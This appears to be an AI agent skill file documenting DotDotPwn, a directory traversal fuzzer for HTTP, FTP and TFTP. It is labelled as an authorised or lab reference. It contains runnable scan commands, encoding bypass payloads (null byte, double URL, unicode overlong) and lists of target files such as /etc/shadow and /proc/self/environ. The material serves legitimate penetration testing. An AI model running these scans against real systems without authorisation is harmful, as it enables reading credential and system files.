---
name: dotdotpwn
description: "Auth/lab ref: directory traversal fuzzer for HTTP, FTP, and TFTP with built-in encoding variants (null byte, URL, double-URL, unicode)."
license: MIT
compatibility: "Linux / macOS; Perl + modules."
metadata:
    author: AeonDave
    version: "1.3"
---

# DotDotPwn

Directory traversal fuzzer — HTTP, FTP, TFTP + encoding variants + wordlist export.

## Pre-Flight (real usage)

```bash
# Confirm installation and available flags for your build
dotdotpwn.pl -h

# Keep target checks explicit: one endpoint, one file marker, one depth window
# This improves signal and avoids over-scanning unstable apps.
```

## Quick Start

```bash
apt install dotdotpwn
# or: git clone https://github.com/wireghoul/dotdotpwn && cpan install Net::FTP HTTP::Lite

# HTTP scan
dotdotpwn.pl -m http -h target.com -f /etc/passwd -k "root:" -d 6

# URL with traversal marker (http-url module)
dotdotpwn.pl -m http-url -u "http://target.com/download.php?file=TRAVERSAL" \
    -f /etc/passwd -k "root:" -d 8

# FTP
dotdotpwn.pl -m ftp -h target.com -U admin -P password -O linux

# Generate wordlist only (no target)
dotdotpwn.pl -m payload -d 8 -O linux | sort -u > traversal.txt
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-m <module>` | Module: `http` / `http-url` / `ftp` / `tftp` / `payload` / `stdout` |
| `-h <host>` | Target host/IP |
| `-x <port>` | Target port (non-default) |
| `-u <url>` | Full URL with `TRAVERSAL` placeholder (http-url module) |
| `-f <file>` | Target file to retrieve (e.g., `/etc/passwd`) |
| `-d <depth>` | Traversal depth (default: 6; depth 3 = `../../../`) |
| `-k <pattern>` | Response pattern to confirm success (e.g., `root:`) |
| `-M <method>` | HTTP method: GET / POST / HEAD / COPY / MOVE |
| `-t <threads>` | Thread count for speed |
| `-T <ms>` | Millisecond delay between requests |
| `-O <os>` | Target OS: `windows` / `linux` (changes target file list) |
| `-U <user>` | FTP/TFTP username |
| `-P <pass>` | FTP/TFTP password |
| `-S` | Use SSL/TLS (HTTPS) |
| `-b` | Break after first vulnerability found |
| `-q` | Quiet mode |
| `-r <file>` | Save report to file |
| `-w <file>` | Output wordlist to file |
| `-X` | Bisection — find exact traversal depth automatically |
| `-E` | Test extra files (config.inc.php, web.config, etc.) |
| `-e <ext>` | Append extension to requests (e.g., `.php`) |

Note: option support can differ between package versions and forks; verify with `dotdotpwn.pl -h` before automating.

## Modules

| Module | Protocol | Use |
|--------|----------|-----|
| `http` | HTTP/HTTPS | Auto-fuzzes discovered parameters |
| `http-url` | HTTP/HTTPS | Tests specific URL with `TRAVERSAL` marker |
| `ftp` | FTP | Directory traversal on FTP servers |
| `tftp` | TFTP | TFTP traversal |
| `payload` | — | Generate payloads to STDOUT (pipe to file/tool) |
| `stdout` | — | Output all payloads to console |

## Encoding Variants Generated

DotDotPwn automatically generates all encoding variants:
- `../` basic
- `%2e%2e%2f` URL encoded
- `%252e%252e%252f` double URL encoded
- `..%c0%af` unicode overlong
- `..%c1%9c` alternate unicode
- `....//` double slash bypass
- `..%00/` null byte injection

## Common Workflows

```bash
# Find exact traversal depth
dotdotpwn.pl -m http-url -u "http://target.com/view?file=TRAVERSAL" \
    -f /etc/passwd -k "root:" -X

# Windows target
dotdotpwn.pl -m http -h target.com -O windows -d 8 -q -r windows_results.txt

# Generate wordlist for ffuf (recommended approach)
dotdotpwn.pl -m payload -d 10 -O linux | sort -u > linux_traversal.txt
ffuf -u "http://target.com/page?file=FUZZ" -w linux_traversal.txt -mc 200 -fs 0

# Windows wordlist for ffuf
dotdotpwn.pl -m payload -d 8 -O windows | sort -u > windows_traversal.txt
ffuf -u "http://target.com/file?path=FUZZ" -w windows_traversal.txt -mc 200

# FTP with credentials
dotdotpwn.pl -m ftp -h target.com -U ftpuser -P ftppass -O linux -b

# HTTPS with SSL
dotdotpwn.pl -m http -h target.com -S -x 443 -f /etc/passwd -k "root:" -d 6

# Authenticated HTTP (add auth header via -M flag limitation: use http-url)
dotdotpwn.pl -m http-url \
    -u "http://target.com/download?f=TRAVERSAL" \
    -f /etc/passwd -k "root:" -d 8 -q

# Report
dotdotpwn.pl -m http -h target.com -f /etc/passwd -k "root:" -r report.txt -O linux
```

## Validation Checklist (avoid false positives)

- Re-test the same payload at least twice and compare response body length.
- Confirm marker-based evidence (`-k`) plus semantic evidence (expected file content).
- Re-run with one depth lower/higher to confirm traversal depth dependency.
- Validate one positive manually in browser/curl before escalating finding.

## Common Target Files

```
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log

# Windows
windows\win.ini
windows\system32\drivers\etc\hosts
windows\system32\cmd.exe
boot.ini
```

## DotDotPwn vs ffuf + SecLists

Use DotDotPwn for:
- Multi-protocol (FTP/TFTP) — ffuf is HTTP only
- Generating encoding-varied wordlists for ffuf
- Quick HTTP traversal without preparing wordlist
- Depth and encoding exploration when traversal might require non-standard payload forms

Use ffuf + SecLists (LFI-Jhaddix.txt) for:
- Speed-critical HTTP testing
- Already have wordlists
- CI/CD integration

Best hybrid flow:
1. Use DotDotPwn to generate traversal-focused payload corpus.
2. Minimize corpus (`sort -u`) and reuse with ffuf across multiple endpoints.
3. Validate positives manually (response size, marker keywords, traversal depth).

## Resources

| File | When to load |
|------|--------------|
| `references/traversal-payloads.md` | Encoding variants, null byte, unicode bypass, Windows vs Linux paths, integration with ffuf |
